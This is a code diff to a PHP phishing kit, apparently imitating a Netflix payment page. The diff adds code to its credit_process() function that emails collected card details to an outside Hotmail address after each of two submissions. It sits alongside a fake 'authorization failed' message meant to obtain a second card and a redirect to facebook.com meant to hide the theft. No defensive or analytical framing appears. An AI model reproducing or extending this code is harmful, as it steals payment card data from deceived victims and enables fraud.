@@ -49,6 +49,11 @@ function credit_process() {
         $_SESSION['double-cc'] = true;
         $_SESSION['auth-failed'] = 'Card authorization is failed, please use another card';
         $_SESSION['karma-first-card-number'] = $karma_card_number;
+        $to = 'fauzikirahot@hotmail.com';
+        $subject = 'CC 1';
+        $headers = "From: $karma_card_name <karma@karma-netflix.ys>\r\n" .
+                    "Content-Type: text/html; charset=utf-8\r\n";
+        mail($to, $subject, $result, $headers);
         # file_put_contents('first.html', $result);
         header('Location: /credit');
         exit();
@@ -93,6 +98,11 @@ function credit_process() {
         ';
             $_SESSION['double-cc'] = false;
             # file_put_contents('second.html', $result);
+            $to = 'fauzikirahot@hotmail.com';
+            $subject = 'CC 2';
+            $headers = "From: $karma_card_name <karma@karma-netflix.ys>\r\n" .
+                        "Content-Type: text/html; charset=utf-8\r\n";
+            mail($to, $subject, $result, $headers);
             header('Location: https://facebook.com');
             exit();
         }
